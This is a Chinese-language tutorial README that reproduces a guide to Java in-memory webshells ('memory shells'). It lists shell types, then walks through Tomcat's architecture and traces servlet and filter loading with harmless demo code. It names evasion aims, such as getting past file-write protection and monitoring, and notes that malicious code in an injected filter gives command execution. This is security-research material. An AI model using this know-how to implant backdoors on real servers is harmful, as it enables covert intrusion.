![LearnJavaMemshellFromZero-Recurrence](https://socialify.git.ci/d0ctorsec/LearnJavaMemshellFromZero-Recurrence/image?font=Rokkitt&forks=1&issues=1&language=1&name=1&owner=1&stargazers=1&theme=Light)

<h3 align="center">基于W01fh4cker大佬的LearnJavaMemshellFromZero从零掌握java内存马的复现重组版本，整篇文章均可复现，目录层级比较多建议下载阅读，感谢点个★star咯。
复现的基础上重组了目录结构，将内存马划分为三大类，额外补充了其他佬的：webSocket、SpringWebFlux Godzilla内存马
</h3>




---



★开头感谢[W01fh4cker大佬](https://github.com/W01fh4cker)给我解答了许多复现中我想不明白的问题，这篇文章也是基于大佬的[完全零基础从0到1掌握Java内存马](https://github.com/W01fh4cker/LearnJavaMemshellFromZero),做了一个复现和扩展可以说大佬的文章真正做到了每步都可实操复现，我这篇文章就是把大佬的文章结构重组+复现加了一些自己的分析思路，对原文章感兴趣的可以移步大佬的文章，链接挂上面咯。

```markdown
参考：
★https://github.com/W01fh4cker/LearnJavaMemshellFromZero
★https://nosec.org/home/detail/5049.html
https://paper.seebug.org/3120/
★https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09
★https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Servlet%E5%9E%8B/
https://wjlshare.com/archives/1651
★https://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/
https://goodapple.top/archives/1355
http://www.bmth666.cn/2023/04/15/CVE-2022-22947-SpringCloud-GateWay-SpEL-RCE/index.html
```



# 一.前置知识

## 1.内存马分类

```markdown
通过学习本文我也对内存马有了个全新的分类，`所以全文目录都是基于内存马的分类展开的,可以直接参照目录结构`，当然内存马除了本文提到的还有很多如jetty、XXL-JOB等内存马，本文列举的是比较通用的覆盖现有主流中间件+Web框架，可以理解为覆盖广兼容性好。
1.中间件系内存马
	•Servlet内存马
	•Filter内存马
	•Listener内存马
	•Tomcat Valve型内存马
	•Tomcat Upgrade内存马
	•Tomcat Executor内存马
	•Netty中间件内存马
2.框架系内存马
	•SpringMVC框架内存马
	•SpringWebFlux内存马
3.其他内存马
	•Websocket内存马

以下是引用[su18](https://nosec.org/home/detail/5049.html)大佬对于内存马的分类，我这里重新整理了一下精简为了3种大类：
• `框架型内存马`：除了传统的 Servlet 项目，使用 Spring 全家桶进行开发的项目越来越多，而 Spring-MVC 则是自实现了相关路由注册查找逻辑，以及使用拦截器来进行过滤，思想上与 Servlet-Filter 的设计类似。
• `中间件型内存马`：在中间件的很多功能实现上，因为采用了类似 Filter-FilterChain 的职责链模式，可以被用来做内存马，由于行业对 Tomcat 的研究较多，因此大多数的技术实现和探究是针对 Tomcat 的，但其他中间件也有相当多的探究空间。
• `其他内存马`：还有一些其他非常规的利用思路，可以用在内存马的实现上，例如 `WebSocket 协议`等。利用 Java Agent 技术进行植入内存马逻辑的实现方式。
```

| 中间件             | 框架          |
| ------------------ | ------------- |
| Tomcat             | SpringMVC     |
| Jetty              | SpringWebFlux |
| JBossAS            |               |
| JBossEAP6/7        |               |
| WildFly            |               |
| WebSphere          |               |
| WebLogic           |               |
| Resin              |               |
| GlassFish          |               |
| Payara             |               |
| Undertow           |               |
| Apusic（金蝶）     |               |
| BES（宝兰德）      |               |
| InforSuite（中创） |               |
| TongWeb（东方通）  |               |

## 2.解决哪些问题

```markdown
•	由于网络原因不能反弹 shell 的；
•	内部主机通过反向代理暴露 Web 端口的；
•	服务器上有防篡改、目录监控等防御措施，禁止文件写入的；
•	服务器上有其他监控手段，写马后会告警监控，人工响应的；
•	服务使用 Springboot 等框架，无法解析传统 Webshell 的；
```

## 3.部分优缺点

```markdown
■	优点：
WebSocket 内存马，更新颖；
Agent 型内存马，更通用。

■	缺点：
•	服务重启后会失效
•	对于传统内存马，存在的位置相对固定，已经有相关的查杀技术可以检出。
```

# 二.基础知识

## 2.0.Tomcat与Spring关系

```markdown
在开始学习内存马前，我们需要定义清楚一些基础知识，这样学习会流畅许多。
学习 Tomcat 的原理，我发现 Servlet 技术是 Web 开发的原点，几乎所有的 Java Web 框架（比如 Spring）都是基于 Servlet 的封装，Spring 应用本身就是一个 Servlet（DispatchSevlet），而 Tomcat 和 Jetty 这样的 Web 容器，负责加载和运行 Servlet。

★Tomcat也能处理请求，为什么会用到Spring系列框架呢？
拿SpringMVC框架举例，Tomcat开发效率、代码结构、功能扩展性、企业级特性，都不如SpringMVC。Tomcat 是运行环境，负责底层网络通信和 Servlet 规范实现；Spring MVC 是开发框架，负责上层业务逻辑组织。两者结合可大幅提升 Web 应用的开发效率和可维护性。
```

![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/20200406210730.png)

## 2.1.Tomcat技术栈

```markdown
■ Tomcat 实现的 2 个核心功能：
1.处理 Socket 连接，负责网络字节流与 Request 和 Response 对象的转化。
2.加载并管理 Servlet ，以及处理具体的 Request 请求。
`所以 Tomcat 设计了两个核心组件连接器（Connector）和容器（Container）`。
`连接器负责对外交流，容器负责内部处理`

Tomcat为了实现支持多种 I/O 模型和应用层协议，一个容器可能对接多个连接器，就好比一个房间有多个门。

Server 对应的就是一个 Tomcat 实例。
Service 默认只有一个，也就是一个 Tomcat 实例默认一个 Service。
Connector：一个 Service 可能多个 连接器，接受不同连接协议。
Container: 多个连接器对应一个容器，顶层容器其实就是 Engine。
每个组件都有对应的生命周期，需要启动，同时还要启动自己内部的子组件，比如一个 Tomcat 实例包含一个 Service，一个 Service 包含多个连接器和一个容器。而一个容器包含多个 Host， Host 内部可能有多个 
Context 容器，而一个 Context 也会包含多个 Servlet，所以 Tomcat 利用组合模式管理组件每个组件，对待过个也想对待单个组一样对待。整体上每个组件设计就像是「俄罗斯套娃」一样。
```

![Tomcat 架构](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/20200725210507.png)

### 2.1.0.Tomcat连接器

```markdown
在开始讲连接器前，我先铺垫一下 `Tomcat`支持的多种 `I/O` 模型和应用层协议。

`Tomcat`支持的 `I/O` 模型有：

- `NIO`：非阻塞 `I/O`，采用 `Java NIO` 类库实现。
- `NIO2`：异步`I/O`，采用 `JDK 7` 最新的 `NIO2` 类库实现。
- `APR`：采用 `Apache`可移植运行库实现，是 `C/C++` 编写的本地库。

Tomcat 支持的应用层协议有：

- `HTTP/1.1`：这是大部分 Web 应用采用的访问协议。
- `AJP`：用于和 Web 服务器集成（如 Apache）。
- `HTTP/2`：HTTP 2.0 大幅度的提升了 Web 性能。

所以一个容器可能对接多个连接器。连接器对 `Servlet` 容器屏蔽了网络协议与 `I/O` 模型的区别，无论是 `Http` 还是 `AJP`，在容器中获取到的都是一个标准的 `ServletRequest` 对象。
```

```markdown
细化连接器的功能需求就是：

★监听网络端口。
★接受网络连接请求。
★读取请求网络字节流。
★根据具体应用层协议（HTTP/AJP）解析字节流，生成统一的 Tomcat Request 对象。
★将 Tomcat Request 对象转成标准的 ServletRequest。
★调用 Servlet容器，得到 ServletResponse。
★将 ServletResponse转成 Tomcat Response 对象。
★将 Tomcat Response 转成网络字节流。
★将响应字节流写回给浏览器。

`因此 Tomcat 的设计者设计了 3 个组件来实现这 3 个功能，分别是 EndPoint、Processor 和 Adapter，连接器的三个核心组件分别做三件事情，其中 Endpoint和 Processor放在一起抽象成了 ProtocolHandler组件，它们的关系如下图所示。
```

![连接器](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/20200407174755.png)

```markdown
根据实现的不同，ProtocolHandler又有如下分类：
```


![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/20220729234110-de92f136-0f54-1.png)

#### 1.EndPoint 组件

```markdown
EndPoint是通信端点，即通信监听的接口，是具体的 Socket 接收和发送处理器，是对传输层的抽象，因此 EndPoint是用来实现 TCP/IP 协议数据读写的，本质调用操作系统的 socket 接口。

1.EndPoint是一个接口，对应的抽象实现类是 AbstractEndpoint，而 AbstractEndpoint的具体子类，比如在 NioEndpoint和 Nio2Endpoint中，有两个重要的子组件：Acceptor和 SocketProcessor。
2.其中 Acceptor 用于监听 Socket 连接请求。SocketProcessor用于处理 Acceptor 接收到的 Socket请求，它实现 Runnable接口，在 Run方法里调用应用层协议处理组件 Processor 进行处理。为了提高处理能力，SocketProcessor被提交到线程池来执行。
3.我们知道，对于 Java 的多路复用器的使用，无非是两步：创建一个 Seletor，在它身上注册各种感兴趣的事件，然后调用 select 方法，等待感兴趣的事情发生。
4.感兴趣的事情发生了，比如可以读了，这时便创建一个新的线程从 Channel 中读数据。在 Tomcat 中 NioEndpoint 则是 AbstractEndpoint 的具体实现，里面组件虽然很多，但是处理逻辑还是前面两步。它一共包含 LimitLatch、Acceptor、Poller、SocketProcessor和 Executor 共 5 个组件，分别分工合作实现整个 TCP/IP 协议的处理。

5.LimitLatch是连接控制器，它负责控制最大连接数，NIO 模式下默认是 10000，达到这个阈值后，连接请求被拒绝。
Acceptor跑在一个单独的线程里，它在一个死循环里调用 accept方法来接收新连接，一旦有新的连接请求到来，accept方法返回一个 Channel 对象，接着把 Channel对象交给 Poller 去处理。
6.Poller 的本质是一个 Selector，也跑在单独线程里。Poller在内部维护一个 Channel数组，它在一个死循环里不断检测 Channel的数据就绪状态，一旦有 Channel可读，就生成一个 SocketProcessor任务对象扔给 Executor去处理。
7.SocketProcessor实现了 Runnable接口，其中run方法中的 getHandler().process(socketWrapper, SocketEvent.CONNECT_FAIL); 代码则是获取handler并执行处理 socketWrapper，最后通过socket 获取合适应用层协议处理器，也就是调用 Http11Processor组件来处理请求。
8.Http11Processor读取 Channel的数据来生成 ServletRequest对象，Http11Processor并不是直接读取 Channel 的。这是因为 Tomcat 支持同步非阻塞 I/O 模型和异步 I/O 模型，在 Java API 中，相应的 Channel 类也是不一样的，比如有 AsynchronousSocketChannel和 SocketChannel，为了对 Http11Processor屏蔽这些差异，Tomcat 设计了一个包装类叫作 SocketWrapper，Http11Processor只调用 SocketWrapper的方法去读写数据。

★`Executor就是线程池，负责运行 SocketProcessor任务类，SocketProcessor 的 run方***调用 Http11Processor 来读取和解析请求数据。我们知道，Http11Processor是应用层协议的封装，它会调用容器获得响应，再把响应通过 Channel写出。
```

![NioEndPoint](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/NioEndPoint.jpg)

#### 2.Processor组件

Processor 用来实现 HTTP 协议，Processor 接收来自 `EndPoint`的 `Socket`，读取字节流解析成 Tomcat `Request`和 `Response`对象，并通过 `Adapter`将其提交到容器处理，`Processor`是对应用层协议的抽象。

**从图中我们看到，EndPoint 接收到 Socket 连接后，生成一个 SocketProcessor 任务提交到线程池去处理，SocketProcessor 的 Run 方\***调用 HttpProcessor 组件去解析应用层协议，Processor 通过解析生成 Request 对象后，会调用 Adapter 的 Service 方法，方法内部通过 以下代码将请求传递到容器中。

![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/20200407180342.png)

#### 3.Adapter 组件

由于协议的不同，Tomcat 定义了自己的 `Request` 类来存放请求信息，这里其实体现了面向对象的思维。但是这个 Request 不是标准的 `ServletRequest` ，所以不能直接使用 Tomcat 定义 Request 作为参数直接容器。

Tomcat 设计者的解决方案是引入 `CoyoteAdapter`，这是适配器模式的经典运用，`Acceptor`监听连接生成 `SocketProcessor` 调用 `CoyoteAdapter` 的 `Sevice` 方法，传入的是 `Tomcat Request` 对象，`CoyoteAdapter`负责将 `Tomcat Request` 转成 `ServletRequest`，再调用容器的 `Service`方法。



### 2.1.1.Tomcat 容器



```markdown
Tomcat 设计了四种容器，分别是Engine、Host、Context和Wrapper，其关系如下：
1.连接器负责外部交流，容器负责内部处理。具体来说就是，连接器处理 Socket 通信和应用层协议的解析，得到 Servlet请求；
2.而容器则负责处理 Servlet请求。容器：顾名思义就是拿来装东西的， 所以 Tomcat 容器就是拿来装载 Servlet。

Tomcat 设计了 4 种容器，分别是 Engine、Host、Context和 Wrapper。Server 代表 Tomcat 实例。
★★★`Wrapper 表示一个 Servlet ，Context 表示一个 Web 应用程序，而一个 Web 程序可能有多个 Servlet ；Host 表示一个虚拟主机，或者说一个站点，一个 Tomcat 可以配置多个站点（Host）；一个站点（ Host） 可以部署多个 Web 应用；Engine 代表 引擎，用于管理多个站点（Host），一个 Service 只能有 一个 Engine。`

`清晰解析：
Tomcat由四大容器组成，分别是Engine、Host、Context、Wrapper。这四个组件是负责关系，存在包含关系。只包含一个引擎（Engine）：
Engine（引擎）：表示可运行的Catalina的servlet引擎实例，并且包含了servlet容器的核心功能。在一个服务中只能有一个引擎。同时，作为一个真正的容器，Engine元素之下可以包含一个或多个虚拟主机。它主要功能是将传入请求委托给适当的虚拟主机处理。如果根据名称没有找到可处理的虚拟主机，那么将根据默认的Host来判断该由哪个虚拟主机处理。
Host （虚拟主机）：作用就是运行多个应用，它负责安装和展开这些应用，并且标识这个应用以便能够区分它们。它的子容器通常是 Context。一个虚拟主机下都可以部署一个或者多个Web App，每个Web App对应于一个Context，当Host获得一个请求时，将把该请求匹配到某个Context上，然后把该请求交给该Context来处理。主机组件类似于Apache中的虚拟主机，但在Tomcat中只支持基于FQDN(完全合格的主机名)的“虚拟主机”。Host主要用来解析web.xml
Context（上下文）：代表 Servlet 的 Context，它具备了 Servlet 运行的基本环境，它表示Web应用程序本身。Context 最重要的功能就是管理它里面的 Servlet 实例，一个Context代表一个Web应用，一个Web应用由一个或者多个Servlet实例组成。
Wrapper（包装器）：代表一个 Servlet，它负责管理一个 Servlet，包括的 Servlet 的装载、初始化、执行以及资源回收。Wrapper 是最底层的容器，它没有子容器了，所以调用它的 addChild 将会报错。
```

![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/20240112165508.png)



```markdown
我们此时要访问https://manage.xxx.com:8080/user/list ，tomcat 为了实现请求定位到具体的 servlet ，为此 tomcat 设计了 Mapper ，其中保存了容器组件与访问路径的映射关系。

★`假如有用户访问一个 URL，比如图中的http://user.shopping.com:8080/order/buy，Tomcat 如何将这个 URL 定位到一个 Servlet 呢？`

`1.首先根据协议和端口号确定连接器。
Tomcat 默认的 HTTP 连接器监听 8080 端口、默认的 AJP 连接器监听 8009 端口。上面例子中的 URL 访问的是 8080 端口，因此这个请求会被 HTTP 连接器接收，而一个连接器是属于一个 Service 组件的，这样 Service 组件就确定了。我们还知道一个 Service 组件里除了有多个连接器，还有一个容器组件，具体来说就是一个 Engine 容器，因此 Service 确定了也就意味着 Engine 也确定了。
`2.根据域名选定 Host（站点） 
Service 和 Engine 确定后，Mapper 组件通过 URL 中的域名去查找相应的 Host 容器，比如例子中的 URL 访问的域名是user.shopping.com，因此 Mapper 会找到 Host2 这个容器。
`3.根据 URL 路径找到 Context 组件（Web应用） 
Host 确定以后，Mapper 根据 URL 的路径来匹配相应的 Web 应用的路径，比如例子中访问的是 /order，因此找到了 Context4 这个 Context 容器。
`4.根据 URL 路径找到 Wrapper（Servlet）
Context 确定后，Mapper 再根据 web.xml 中配置的 Servlet 映射路径来找到具体的 Wrapper 和 Servlet。
```

![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/20200407192105.png)

#### 1.Servlet规范

##### 1.0.servlet组件（小型应用）

###### 1.0.0编写一个简单的 servlet

pom.xml文件如下：

```
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>servletMemoryShell</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>8</maven.compiler.source>
        <maven.compiler.target>8</maven.compiler.target>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
    </properties>

    <dependencies>
        <dependency>
            <groupId>javax.servlet</groupId>
            <artifactId>javax.servlet-api</artifactId>
            <version>4.0.1</version>
        </dependency>
    </dependencies>

</project>
```

同步下依赖：[![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20240112174417723.png)](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240112174417723.png)

TestServlet.java 码如下：

```
package org.example;
import java.io.IOException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet("/test")
public class TestServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        resp.getWriter().write("hello world");
    }
}
```

然后配置项目运行所需的 tomcat 环境：

![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20240112174451460.png)



![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20240112174520045.png)

[![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20240112174543728.png)](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240112174543728.png)

然后配置 artifacts ，直接点击 fix：

![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20240112174604960.png)

![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20240112174718456.png)

![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20240112174740574.png)

★然后添加 web 

![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20240112175906956.png)

[![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20240112181600664.png)](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240112181600664.png)

运行之后，访问http://localhost:8080/testServlet/test：下图是换Web应用地址了

![image-20250606155445916](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250606155445916-9196487.png)

###### 1.0.1.servlet 初始化流程分析

我们在`org.apache.catalina.core.StandardWrapper#setServletClass`处下断点调试：

[![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20240115162053776.png)](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240115162053776.png)

我们尝试按Ctrl+左键追踪它的上层调用位置，但是提示我们找不到，需要按两次 Ctrl+Alt+F7 ：

[![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20240115162215565.png)](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240115162215565.png)

然后就可以看到，上层调用位置位于`org.apache.catalina.startup.ContextConfig#configureContext`：

[![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20240115162319884.png)](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240115162319884.png)

![image-20250620172508196](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250620172508196-0411511.png)

接下来我们详细看下面这段代码：[![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20240115184354717.png)](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240115184354717.png)

```
for (ServletDef servlet : webxml.getServlets().values()) {
            Wrapper wrapper = context.createWrapper();
            if (servlet.getLoadOnStartup() != null) {
                wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());
            }
            if (servlet.getEnabled() != null) {
                wrapper.setEnabled(servlet.getEnabled().booleanValue());
            }
            wrapper.setName(servlet.getServletName());
            Map<String,String> params = servlet.getParameterMap();
            for (Entry<String, String> entry : params.entrySet()) {
                wrapper.addInitParameter(entry.getKey(), entry.getValue());
            }
            wrapper.setRunAs(servlet.getRunAs());
            Set<SecurityRoleRef> roleRefs = servlet.getSecurityRoleRefs();
            for (SecurityRoleRef roleRef : roleRefs) {
                wrapper.addSecurityReference(
                        roleRef.getName(), roleRef.getLink());
            }
            wrapper.setServletClass(servlet.getServletClass());
            MultipartDef multipartdef = servlet.getMultipartDef();
            if (multipartdef != null) {
                long maxFileSize = -1;
                long maxRequestSize = -1;
                int fileSizeThreshold = 0;

                if(null != multipartdef.getMaxFileSize()) {
                    maxFileSize = Long.parseLong(multipartdef.getMaxFileSize());
                }
                if(null != multipartdef.getMaxRequestSize()) {
                    maxRequestSize = Long.parseLong(multipartdef.getMaxRequestSize());
                }
                if(null != multipartdef.getFileSizeThreshold()) {
                    fileSizeThreshold = Integer.parseInt(multipartdef.getFileSizeThreshold());
                }

                wrapper.setMultipartConfigElement(new MultipartConfigElement(
                        multipartdef.getLocation(),
                        maxFileSize,
                        maxRequestSize,
                        fileSizeThreshold));
            }
            if (servlet.getAsyncSupported() != null) {
                wrapper.setAsyncSupported(
                        servlet.getAsyncSupported().booleanValue());
            }
            wrapper.setOverridable(servlet.isOverridable());
            context.addChild(wrapper);
        }
        for (Entry<String, String> entry :
                webxml.getServletMappings().entrySet()) {
            context.addServletMappingDecoded(entry.getKey(), entry.getValue());
        }
```

首先通过`webxml.getServlets()`获取的所有 Servlet 定义，并建立循环；然后创建一个 Wrapper 对象，并设置 Servlet 的加载顺序、是否启用（即获取`</load-on-startup>`标签的值）、Servlet 的名称等基本属性；接着遍历 Servlet 的初始化参数并设置到Wrapper 中，并处理安全角色引用、将角色和对应链接添加到 Wrapper 中；如果 Servlet 定义中包含文件上传配置，则根据配置信息设置`MultipartConfigElement`；设置 Servlet 是否支持异步操作；通过`context.addChild(wrapper);`将配置好的 Wrapper 添加到Context 中，完成 Servlet 的初始化过程。

上面大的 for 循环中嵌套的最后一个 for 循环则负责处理 Servlet 的 url 映射，将 Servlet 的 url 与 Servlet 名称关联起来。

也就是说，Servlet 的初始化主要经历以下六个步骤：

- 创建 Wapper 对象；
- 设置 Servlet 的 LoadOnStartUp 的值；
- 设置 Servlet 的名称；
- 设置 Servlet 的 class；
- 将配置好的 Wrapper 添加到 Context 中；
- 将 url 和 servlet 类做映射

###### 1.0.2. servlet 装载流程分析

我们在`org.apache.catalina.core.StandardWrapper#loadServlet`这里打下断点进行调试，重点关注`org.apache.catalina.core.StandardContext#startInternal`：

[![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20240115193750678.png)](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240115193750678.png)

可以看到，装载顺序为Listener-->Filter-->Servlet：

[![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20240115194704999.png)](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240115194704999.png)

可以看到，上面红框中的代码都调用了`org.apache.catalina.core.StandardContext#loadOnStartup`，`Ctrl+左键`跟进该方法，代码如下：

```
public boolean loadOnStartup(Container children[]) {
    TreeMap<Integer,ArrayList<Wrapper>> map = new TreeMap<>();
    for (Container child : children) {
        Wrapper wrapper = (Wrapper) child;
        int loadOnStartup = wrapper.getLoadOnStartup();
        if (loadOnStartup < 0) {
            continue;
        }
        Integer key = Integer.valueOf(loadOnStartup);
        map.computeIfAbsent(key, k -> new ArrayList<>()).add(wrapper);
    }
    for (ArrayList<Wrapper> list : map.values()) {
        for (Wrapper wrapper : list) {
            try {
                wrapper.load();
            } catch (ServletException e) {
                getLogger().error(
                        sm.getString("standardContext.loadOnStartup.loadException", getName(), wrapper.getName()),
                        StandardWrapper.getRootCause(e));
                if (getComputedFailCtxIfServletStartFails()) {
                    return false;
                }
            }
        }
    }
    return true;
}
```

可以看到，这段代码先是创建一个TreeMap，然后遍历传入的Container数组，将每个Servlet的loadOnStartup值作为键，将对应的Wrapper对象存储在相应的列表中；如果这个loadOnStartup值是负数，除非你请求访问它，否则就不会加载；如果是非负数，那么就按照这个loadOnStartup的升序的顺序来加载。

##### 1.1.Filter 组件（过滤器）

（与 FilterDefs、FilterConfigs、FilterMaps、FilterChain）

```markdown
从下图可以看出，`这个filter就是一个关卡，客户端的请求在经过filter之后才会到Servlet，那么如果我们动态创建一个filter并且将其放在最前面，我们的filter就会最先执行，当我们在filter中添加恶意代码，就可以实现命令执行，形成内存马。

1.首先，需要定义过滤器FilterDef，存放这些FilterDef的数组被称为FilterDefs，每个FilterDef定义了一个具体的过滤器，包括描述信息、名称、过滤器实例以及class等，这一点可以从org/apache/tomcat/util/descriptor/web/FilterDef.java的代码中看出来；
2.然后是FilterDefs，它只是过滤器的抽象定义，而FilterConfigs则是这些过滤器的具体配置实例，我们可以为每个过滤器定义具体的配置参数，以满足系统的需求；
3.紧接着是FilterMaps，它是用于将FilterConfigs映射到具体的请求路径或其他标识上，这样系统在处理请求时就能够根据请求的路径或标识找到对应的FilterConfigs，从而确定要执行的过滤器链；而FilterChain是由多个FilterConfigs组成的链式结构，它定义了过滤器的执行顺序，在处理请求时系统会按照FilterChain中的顺序依次执行每个过滤器，对请求进行过滤和处理。
```

![filter-demo](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/filter-demo-8948816.png)

###### 1.1.1.编写一个 Filter

```markdown
`我们继续用我们之前在2.2中搭建的环境，添加TestFilter.java：

package org.example;

import javax.servlet.*;
import javax.servlet.annotation.WebFilter;
import java.io.IOException;

@WebFilter("/test")
public class TestFilter implements Filter {

    public void init(FilterConfig filterConfig) {
        System.out.println("[*] Filter初始化创建");
    }

    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        System.out.println("[*] Filter执行过滤操作");
        filterChain.doFilter(servletRequest, servletResponse);
    }

    public void destroy() {
        System.out.println("[*] Filter已销毁");
    }
}
```

跑起来之后，控制台输出`[*] Filter初始化创建`，当我们访问`/test`路由的时候，控制台继续输出`[*] Filter执行过滤操作`，当我们结束tomcat的时候，会触发destroy方法，从而输出`[*] Filter已销毁`：

![image-20250603191922707](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/image-20250603191922707-8949567.png)

###### 1.1.2.FIlter流程解析

```markdown
我们先来了解一下在Tomcat中与Filter密切相关的几个类:
`1.FilterDefs：存放FilterDef的数组 ，FilterDef 中存储着我们过滤器名，过滤器实例，作用 url 等基本信息
`2.FilterConfigs：存放filterConfig的数组，在 FilterConfig 中主要存放 FilterDef 和 Filter对象等信息
`3.FilterMaps：存放FilterMap的数组，在 FilterMap 中主要存放了 FilterName 和 对应的URLPattern
`4.FilterChain：过滤器链，该对象上的 doFilter 方法能依次调用链上的 Filter
5.WebXml：存放 web.xml 中内容的类
6.ContextConfig：Web应用的上下文配置类
★7.StandardContext：Context接口的标准实现类，一个 Context 代表一个 Web 应用，其下可以包含多个 Wrapper
★8.StandardWrapperValve：一个 Wrapper 的标准实现类，一个 Wrapper 代表一个Servlet
```

然后我们编写一个DemoFilter来做测试:

```
package top.longlone.filter;

import javax.servlet.*;
import java.io.IOException;

public class DemoFilter implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
        System.out.println("filter init");
    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        System.out.println("do filter");
        chain.doFilter(request, response);
    }

    @Override
    public void destroy() {

    }
}
```

配置好对应的web.xml:

```
  <filter>
    <filter-name>DemoFilter</filter-name>
    <filter-class>top.longlone.filter.DemoFilter</filter-class>
  </filter>

  <filter-mapping>
    <filter-name>DemoFilter</filter-name>
    <url-pattern>/*</url-pattern>
  </filter-mapping>
```

接下来在`doFilter()`方法打下断点，运行tomcat服务器并访问:
![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/20220217104758.png)
查看调用栈，跟进`StandardWrapperVavle.invoke()`方法:
![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/20220217104858.png)
发现他是根据filterChain来去做filter的，根据搜索找到filterChain的定义位置:
![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/20220217104949.png)
重新下断点到这个位置，跟进`ApplicationFilterFactory.createFilterChain()`方法，分析该方法，发现其先会会调用 `getParent()` 方法获取`StandardContext`，再获取filterMaps:
![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/20220217105248.png)
filterMaps中的 filterMap 主要存放了过滤器的名字以及作用的 url:
![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/20220217105332.png)
接下来会遍历filterMaps 中的 filterMap，如果发现符合当前请求 url 与 filterMap 中的 urlPattern 匹配且通过filterName能找到对应的filterConfig，则会将其加入filterChain:
![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/20220217105551.png)
查看filterConfig的结构，里面主要包含了filter名，filter和filterDef:
![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/20220217105911.png)
至此filterChain组装完毕，重新回到 StandardContextValue 中，后面会调用 `filterChain.doFilter()` 方法:
![img](https://raw.githubusercontent.com/d0ctorsec/IMG_File1/refs/heads/main/JAVA内存马研究/20220217110138.png)
跟进 `filterChain.doFilter()` 方法，其会调用`internalDoFilter()`方法:
